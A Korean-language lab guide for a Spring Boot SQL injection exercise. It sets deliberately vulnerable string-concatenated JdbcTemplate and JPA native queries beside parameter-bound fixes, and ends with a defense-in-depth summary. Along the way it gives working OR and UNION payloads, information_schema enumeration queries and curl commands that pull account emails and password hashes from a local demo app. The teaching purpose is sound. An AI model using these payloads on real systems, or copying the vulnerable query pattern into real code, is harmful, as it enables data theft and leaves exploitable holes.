# 01. SQL Injection 실습 (Spring Boot / JdbcTemplate)

> 브랜치: `feature/sqli-demo`
> 대상 코드: `com.basic.myspringboot.vuln.sqli` 패키지 (교육용, 격리됨)
> 기존 안전 코드: `StudentSearchService` (JPQL 파라미터 바인딩)

---

## 1. 개념 요약과 학습 목표

**SQL Injection이란?** 사용자 입력을 "데이터(값)"가 아니라 "SQL 구문(명령)"으로 취급할 때, 공격자가 입력에 SQL을 끼워 넣어 DB를 조종하는 공격이다. (웹 요청 → 서버가 입력으로 쿼리 조립 → DB 실행, 이 **조립 단계**가 문제)

**대상 테이블** (실습 앱)

| 테이블 | 주요 컬럼 |
|---|---|
| `students` | student_id, name, student_number, department_id, user_info_id |
| `user_info` (표적) | id, name, email, **password(해시)**, roles |

**UNION 기초**: 두 SELECT 결과를 세로로 합친다. ① 컬럼 수가 같아야 하고 ② 타입이 호환돼야 성립한다. 컬럼명은 첫 SELECT를 따르므로, 다른 테이블 값이 원래 컬럼 자리에 표시된다 → 계정 정보가 "학생 이름" 칸에 섞여 나오는 원리.

**학습 목표**
- 같은 코드가 **문자열 결합 vs 파라미터 바인딩**으로 취약/안전이 갈림을 이해한다.
- UNION 인젝션으로 `user_info` 계정·비밀번호 해시를 탈취하는 과정을 체험한다.
- (상세 개념·SQL/UNION 문법은 Word 교안 `01_SQL_Injection.docx` 1~2장 참고)

---

## 2. 취약점이 생기는 지점

`SqlInjectionDemoService.searchVulnerable()`:

```java
// 🔴 취약 : 입력이 SQL 구문의 일부가 된다
String sql = "SELECT student_id, name, student_number FROM students "
           + "WHERE name LIKE '%" + name + "%'";
return jdbcTemplate.queryForList(sql);
```

`SqlInjectionDemoService.searchSafe()`:

```java
// 🟢 안전 : 입력은 '?' 자리에 "값"으로만 전달된다
String sql = "SELECT student_id, name, student_number FROM students WHERE name LIKE ?";
return jdbcTemplate.queryForList(sql, "%" + name + "%");
```

> **핵심**: 취약 코드는 입력을 **구문(SQL)** 으로, 안전 코드는 입력을 **데이터(값)** 로 다룬다.

---

## 3. 엔드포인트

| 용도 | 메서드 | URL |
|---|---|---|
| 🔴 취약 검색 (JdbcTemplate) | GET | `/api/vuln/sqli/students?name=Alice` |
| 🟢 안전 검색 (JdbcTemplate) | GET | `/api/vuln/sqli/students-safe?name=Alice` |
| 실행 SQL 확인 | GET | `/api/vuln/sqli/students/debug?name=...` |
| 🔴 취약 검색 (JPA 네이티브) | GET | `/api/vuln/sqli/students-jpa?name=Alice` |
| 🟢 안전 검색 (JPA 네이티브) | GET | `/api/vuln/sqli/students-jpa-safe?name=Alice` |

> 실습 편의를 위해 `/api/vuln/**` 는 인증 없이 접근할 수 있도록 열려 있다(`SecurityConfig`).

---

## 4. 실습 단계

### 4-1. 정상 동작 확인

```
GET /api/vuln/sqli/students?name=Alice
```
→ 이름에 `Alice` 가 포함된 학생만 조회된다.

### 4-2. 항상 참(OR) 인젝션 — 전체 유출

```
name = %' OR '1'='1
```
브라우저 주소창에 넣을 때는 URL 인코딩이 필요하다:
```
/api/vuln/sqli/students?name=%25%27%20OR%20%271%27%3D%271
```
→ 조건이 항상 참이 되어 **모든 학생**이 조회된다. (안전 엔드포인트에서는 검색어로만 취급되어 결과 없음)

### 4-3. 컬럼 수 확인

취약 쿼리의 SELECT 컬럼은 3개(`student_id`, `name`, `student_number`)다. UNION 은 컬럼 수가 같아야 성립한다.

```
name = %' UNION SELECT 1,2,3 #
```
→ `1, 2, 3` 한 행이 결과에 섞여 나오면 컬럼 수가 3으로 맞은 것이다.

### 4-4.  UNION 기반 계정 정보 탈취

```
name = %' UNION SELECT id, email, password FROM user_info #
```
→ 검색 결과에 **`user_info` 테이블의 id / 이메일 / BCrypt 비밀번호 해시**가 학생 목록과 함께 조회된다.
( `admin@aa.com`, `user@aa.com` 계정의 해시가 노출된다 )

### 4-5. DB 메타정보 탈취 (교재 6장과 동일 기법)

```
name = %' UNION SELECT table_schema, table_name, 3 FROM information_schema.tables #
name = %' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='user_info' #
```
→ 공격자가 테이블·컬럼 구조를 알아내는 과정. (교재 219p 실습파일의 흐름과 동일)

###  실습 함정 : 브라우저 주소창은 페이로드를 훼손한다

브라우저 주소창에 페이로드를 직접 넣으면 인젝션이 **실패**할 수 있다.

- **`#` 이후는 서버로 전송되지 않는다** — `#` 은 URL 프래그먼트 기호라 브라우저가 잘라낸다. 주석 종결자 `#` 이 사라져 UNION 이 완성되지 않는다.
- **공백·`%` 처리가 브라우저마다 다르다** — 인코딩이 어긋나 구문이 깨진다.

→ 반드시 **`curl` 또는 Postman** 으로, 정확히 인코딩해서 요청한다. (`#` → `%23`, 공백 → `%20`, `%` → `%25`)

```bash
# 정상 동작하는 UNION 인젝션 ( # 를 %23 로 인코딩 )
curl "http://localhost:8080/api/vuln/sqli/students?name=%25%27%20UNION%20SELECT%20id,email,password%20FROM%20user_info%20%23"
```
결과 마지막에 `admin@aa.com` / `user@aa.com` 과 BCrypt 해시가 학생 목록 뒤에 붙어 나오면 성공이다.

### 4-6. 안전 엔드포인트로 방어 확인

같은 페이로드를 `/api/vuln/sqli/students-safe?name=...` 에 넣으면
→ 따옴표·UNION 이 **검색 문자열**로만 취급되어 인젝션이 성립하지 않는다(결과 없음 또는 정상 검색).

---

## 4-7. "JPA라서 안전한 게 아니다" — 도구가 아니라 코딩 방식의 문제

가장 흔한 오해 : *"우리는 JPA를 쓰니까 SQL 인젝션은 걱정 없다."*

취약/안전을 가르는 것은 **도구(JPA vs JdbcTemplate)** 가 아니라 **문자열 결합 vs 파라미터 바인딩** 이다.

| 도구 | 문자열 결합 | 파라미터 바인딩 |
|---|---|---|
| JdbcTemplate | 🔴 취약 (`students`) | 🟢 안전 (`students-safe`) |
| **JPA 네이티브** | 🔴 **취약** (`students-jpa`) | 🟢 안전 (`students-jpa-safe`) |

JPA 취약 코드(`JpaSqlInjectionDemoService`):
```java
// 🔴 JPA 인데도 문자열을 결합하면 동일하게 뚫린다
String sql = "SELECT student_id, name, student_number FROM students "
           + "WHERE name LIKE '%" + name + "%'";
entityManager.createNativeQuery(sql).getResultList();
```
```java
// 🟢 같은 네이티브 쿼리라도 바인딩하면 안전하다
String sql = "SELECT student_id, name, student_number FROM students WHERE name LIKE :name";
entityManager.createNativeQuery(sql).setParameter("name", "%" + name + "%").getResultList();
```

실습 : JdbcTemplate 취약 엔드포인트에서 성공한 UNION 페이로드를 **`/api/vuln/sqli/students-jpa`** 에 그대로 넣으면 동일하게 `user_info` 계정/해시가 탈취된다.

```bash
curl "http://localhost:8080/api/vuln/sqli/students-jpa?name=%25%27%20UNION%20SELECT%20id,email,password%20FROM%20user_info%20%23"
```

> **결론**: `@Query` 명명 파라미터, JPA 메서드 쿼리, `JdbcTemplate ?` 바인딩은 모두 안전하다.
> 반대로 **입력을 문자열로 조립하는 순간, 어떤 도구를 쓰든 취약**하다.
> ( 이 프로젝트의 실제 검색 기능 `StudentSearchService` 는 JPQL 바인딩이라 안전하다 )

## 5. 방어 정리

방어는 한 가지에 의존하지 않고 여러 겹으로 쌓는 **심층 방어(Defense in Depth)** 가 원칙이다. 근본은 파라미터 바인딩이고, 나머지는 이를 보완하거나 피해를 줄인다.

| 계층 | 방법 | 현재 앱 |
|---|---|---|
| **근본** | 파라미터 바인딩(`?` / `:name`), JPA 메서드 쿼리 | 정상 검색은 이미 안전 |
| 보조 | 입력 검증(화이트리스트), 타입 강제 | `@Valid` DTO, `PathVariable Long` |
| 피해축소 | DB 계정 최소 권한 | (권장) `boot` 계정 권한 축소 |
| 피해축소 | 오류 메시지 숨김 | `@RestControllerAdvice` |
| 피해축소 | 민감정보 암호화 | BCrypt 적용됨 |
| 심화 | WAF/IDS·IPS, 패치, 로깅·모니터링 | (권장) 교재 18장 Snort 연계 |

**WAF/IDS/IPS 약어**
- **WAF** (Web Application Firewall) — 웹 요청의 공격 패턴 차단
- **IDS** (Intrusion Detection System) — 침입 **탐지**·경보
- **IPS** (Intrusion Prevention System) — 침입 **방지**(탐지+차단)
- 단, 인코딩·변형으로 우회될 수 있어 **파라미터 바인딩을 대체하지 못한다**(보조 수단).

> 기존 `StudentSearchService` + `StudentRepository` 는 JPQL 명명 파라미터 바인딩을 사용하므로 안전하다. 취약점은 교육용으로 별도 추가한 것이다.
> 상세 방어 대책은 Word 교안 `01_SQL_Injection.docx` 8장 참고.

---

## 6. 실행 방법

```bash
# 1) MariaDB(3307) 기동 확인 후
./mvnw spring-boot:run

# 2) 브라우저 또는 curl 로 위 엔드포인트 호출
curl "http://localhost:8080/api/vuln/sqli/students?name=Alice"
```
